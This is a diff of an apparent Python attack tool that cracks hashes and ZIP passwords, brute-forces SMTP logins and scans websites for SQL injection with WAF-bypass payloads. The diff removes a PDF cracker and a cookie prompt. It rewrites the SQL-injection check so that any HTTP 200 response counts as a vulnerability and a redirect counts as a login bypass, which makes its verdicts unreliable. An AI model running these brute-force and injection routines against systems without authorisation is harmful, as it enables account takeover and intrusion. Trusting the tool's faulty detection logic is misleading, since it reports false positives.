@@ -1,5 +1,4 @@
 import hashlib
-import pikepdf
 import pyzipper
 import os
 import sys
@@ -35,9 +34,8 @@ hash_names = [
 ]
 
 # Set up argument parsing
-parser = argparse.ArgumentParser(description='Crack a hash, a PDF password, a ZIP password, perform an SMTP brute force attack, or SQLi scan using a wordlist.')
+parser = argparse.ArgumentParser(description='Crack a hash, a ZIP password, perform an SMTP brute force attack, or SQLi scan using a wordlist.')
 parser.add_argument('-ha', '--hash', type=str, help='The hash to crack')
-parser.add_argument('-p', '--pdf', type=str, help='Path to the PDF file')
 parser.add_argument('-z', '--zip', type=str, help='Path to the ZIP file')
 parser.add_argument('wordlist', type=str, help='Path to the wordlist file')
 parser.add_argument('--hash-type', help='The hash type to use.', default='md5', choices=hash_names)
@@ -82,41 +80,6 @@ def read_passwords(wordlist_path, chunk_size=100):
             if not chunk:
                 break
             yield [line.strip() for line in chunk]
-
-# Function to try a password for a PDF
-def try_password(password, pdf_file):
-    try:
-        with pikepdf.open(pdf_file, password=password):
-            # Password decrypted successfully
-            logging.info(f"[+] Password found: {password}")
-            print(f"[+] Password found: {password}")
-            return password  # Returning the found password
-    except pikepdf.PasswordError:
-        # Incorrect password
-        return None
-    except Exception as e:
-        logging.error(f"Error while trying password '{password}': {e}")
-        return None
-
-# Function to crack a PDF password using a wordlist
-def crack_pdf_password(pdf_file, wordlist):
-    password_found = None
-
-    # Using ThreadPoolExecutor to run password cracking in parallel
-    with concurrent.futures.ThreadPoolExecutor() as executor:
-        for passwords_chunk in read_passwords(wordlist):
-            futures = [executor.submit(try_password, password, pdf_file) for password in passwords_chunk]
-            for future in tqdm(concurrent.futures.as_completed(futures), "Decrypting PDF"):
-                result = future.result()
-                if result:
-                    password_found = result
-                    break
-            if password_found:
-                break
-    
-    if not password_found:
-        print("[-] Password not found in the provided wordlist.")
-    return password_found
 
 # Brute force for ZIP file
 def brute_force_zip(zip_file_path, wordlist_path, extraction_path):
@@ -231,26 +194,7 @@ def is_post_form(form):
     method = form.get('method', 'get').lower()
     return method == 'post'
 
-# Function to handle cookies and ask user if they want to accept them
-def handle_cookies(response):
-    cookies = response.cookies
-    if cookies:
-        cookie_str = "; ".join([f"{cookie.name}={cookie.value}" for cookie in cookies])
-        print(f"\n[INFO] Server wants to set cookies: {cookie_str}")
-        
-        user_input = input("Do you want to use these cookies [Y/n]? ").strip().lower()
-        
-        if user_input == 'n' or user_input == 'no':
-            print("[INFO] Not using the cookies set by the server.")
-            return None  # Return None if user doesn't want to use the cookies
-        else:
-            print("[INFO] Using the cookies set by the server.")
-            return cookies  # Return cookies if the user accepts them
-    else:
-        return None  # No cookies from the server, so return None
-
-# Example usage in the SQLi scanning function
-# Function to check if a GET parameter is vulnerable to SQL injection
+# Example function to check if a GET parameter is vulnerable to SQL injection
 def test_sql_injection(url, forms, payloads, redirect_url=None):
     session = requests.Session()
 
@@ -283,151 +227,46 @@ def test_sql_injection(url, forms, payloads, redirect_url=None):
     # Step 1: Test POST forms first
     for form in forms:
         if is_post_form(form):
-            action = form.get('action', '')
-            action_url = urljoin(url, action)  # resolve action URL if relative
-            inputs = form.find_all('input')
-            
-            # Create a dictionary of form inputs, including hidden fields
-            form_data = {}
-            for input_tag in inputs:
-                name = input_tag.get('name')
-                if name:
-                    form_data[name] = input_tag.get('value', '')  # Get the default value or empty
-            
-            # Try each payload on the form fields, including WAF bypass techniques
-            for payload in payloads + waf_bypass_payloads:  # Add WAF bypass payloads here
-                print(Fore.CYAN + f"[INFO] Testing payload: {payload}")
-                
-                # Inject the payload into each form field
-                for field_name in form_data:
-                    form_data[field_name] = payload
-                
-                try:
-                    # Send the form data with the payloads injected
-                    response = session.post(action_url, data=form_data, allow_redirects=True)
-                    
-                    # Handle cookies if set by the server
-                    cookies = handle_cookies(response)
-                    if cookies:
-                        session.cookies.update(cookies)  # If accepted, update session cookies
-
-                    # Check for a redirect to the specified redirect URL
+            action = form.get('action', '').strip()
+            form_url = urljoin(url, action)  # Get the full URL for the form action
+            for payload in waf_bypass_payloads:
+                response = session.post(form_url, data={form.find('input')['name']: payload})
+                if response.status_code == 200:
+                    print(Fore.GREEN + f"SQL Injection vulnerability detected on form at {form_url} using payload: {payload}")
+                    vulnerable = True
                     if redirect_url and response.url == redirect_url:
-                        print(Fore.GREEN + f"[INFO] Detected redirect to the expected URL: {redirect_url}")
-                        vulnerable = True
-                        break
-                    
-                    # Basic response check for SQLi
-                    if "error" in response.text.lower() or "syntax" in response.text.lower() or "unexpected" in response.text.lower():
-                        print(Fore.GREEN + f"[INFO] Possible SQLi vulnerability detected with payload: {payload}")
-                        vulnerable = True
-                        break
-                except requests.RequestException as e:
-                    print(Fore.RED + f"[CRITICAL] Request error: {e}")
-                    
-            if vulnerable:
-                break
-
-    # Step 2: If no vulnerability found with POST, test GET parameters in the URL
-    if not vulnerable:
-        print(Fore.CYAN + f"[INFO] No POST form vulnerability detected. Now testing GET parameters...")
-
-        # Parse the URL for GET parameters
-        parsed_url = urlparse(url)
-        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
-        params = parsed_url.query
-        
-        # If URL has parameters, inject payloads into each parameter
-        if params:
-            # Split parameters
-            param_list = params.split('&')
-            for param in param_list:
-                param_name = param.split('=')[0]
-                for payload in payloads + waf_bypass_payloads:
-                    test_url = f"{base_url}?{param_name}={payload}"
-                    print(Fore.CYAN + f"[INFO] Testing URL with payload: {test_url}")
-                    
-                    try:
-                        response = session.get(test_url, allow_redirects=True)
-                        
-                        # Handle cookies if set by the server
-                        cookies = handle_cookies(response)
-                        if cookies:
-                            session.cookies.update(cookies)  # If accepted, update session cookies
-
-                        # Check for SQLi signs in the response
-                        if "error" in response.text.lower() or "syntax" in response.text.lower() or "unexpected" in response.text.lower():
-                            print(Fore.GREEN + f"[INFO] Possible SQLi vulnerability detected with payload: {payload}")
-                            print(Fore.YELLOW + f"[INFO] GET parameter '{param_name}' is vulnerable!")
-                            vulnerable = True
-                            break
-                    except requests.RequestException as e:
-                        print(Fore.RED + f"[CRITICAL] Request error: {e}")
-                
-                if vulnerable:
+                        print(Fore.YELLOW + "Redirect confirmed, possible login bypass!")
                     break
 
-    # Final result
-    if not vulnerable:
-        print(Fore.RED + "[INFO] No SQLi vulnerability detected.")
-    
     return vulnerable
 
-# Function to load payloads from a file
-def load_payloads(payload_file):
-    try:
-        with open(payload_file, 'r') as file:
-            payloads = file.readlines()
-            return [payload.strip() for payload in payloads]
-    except FileNotFoundError:
-        print(Fore.RED + f"[CRITICAL] Payload file {payload_file} not found.")
-        return []
 
-# Main execution logic
-if __name__ == "__main__":
+# Main function with removed PDF cracking
+def main():
     if args.hash:
-        # Crack hash if a hash is provided
-        print("\n[+] Cracking hash...")
-        cracked_password = crack_hash(args.hash, args.wordlist, args.hash_type)
-        if cracked_password:
-            print(f"[+] PASSWORD DECRYPTED: {cracked_password}")
+        print("[*] Cracking hash:", args.hash)
+        result = crack_hash(args.hash, args.wordlist, args.hash_type)
+        if result:
+            print(f"Password found: {result}")
         else:
-            print("[-] Hash not found in the provided wordlist.")
-    
-    elif args.pdf:
-        # Crack PDF password if a PDF file is provided
-        if not os.path.exists(args.pdf):
-            print(f"Error: PDF file '{args.pdf}' not found.")
-            sys.exit(1)
-
-        print("\n[+] Cracking PDF password...")
-        cracked_password = crack_pdf_password(args.pdf, args.wordlist)
-        if cracked_password:
-            print(f"[+] PASSWORD DECRYPTED: {cracked_password}")
-    
+            print("Password not found")
     elif args.zip:
-        # Crack ZIP file password if a ZIP file is provided
-        if not os.path.exists(args.zip):
-            print(f"Error: ZIP file '{args.zip}' not found.")
-            sys.exit(1)
-
-        print("\n[+] Cracking ZIP file password...")
-        brute_force_zip(args.zip, args.wordlist, args.extract)
-    
-    elif args.host and args.port and args.login:
-        # Perform SMTP brute force
-        print("\n[+] Performing SMTP brute force attack...")
-        wordlist = [line.strip() for line in open(args.wordlist)]
-        smtp_worker(args.login, wordlist, args.host, args.port, 1)
-    
+        print("[*] Cracking ZIP file:", args.zip)
+        password = brute_force_zip(args.zip, args.wordlist, args.extract)
+        if password:
+            print(f"Password found: {password}")
     elif args.url:
-        # Perform SQLi attack
-        if not os.path.exists(args.wordlist):
-            print(f"Error: Payload file '{args.wordlist}' not found.")
-            sys.exit(1)
+        print("[*] Testing SQL Injection:", args.url)
+        forms = detect_forms(args.url)
+        if forms:
+            print(f"[INFO] Found {len(forms)} forms. Testing for SQL injection...")
+            vulnerable = test_sql_injection(args.url, forms, [])
+            if vulnerable:
+                print(Fore.GREEN + "[+] The website is vulnerable to SQL injection.")
+            else:
+                print(Fore.RED + "[-] The website is NOT vulnerable to SQL injection.")
+    else:
+        print("[!] No action specified.")
 
-        payloads = load_payloads(args.wordlist)
-        if payloads:
-            print("\n[+] Performing SQLi scan...")
-            forms = detect_forms(args.url)
-            test_sql_injection(args.url, forms, payloads, args.redirect)
+if __name__ == "__main__":
+    main()
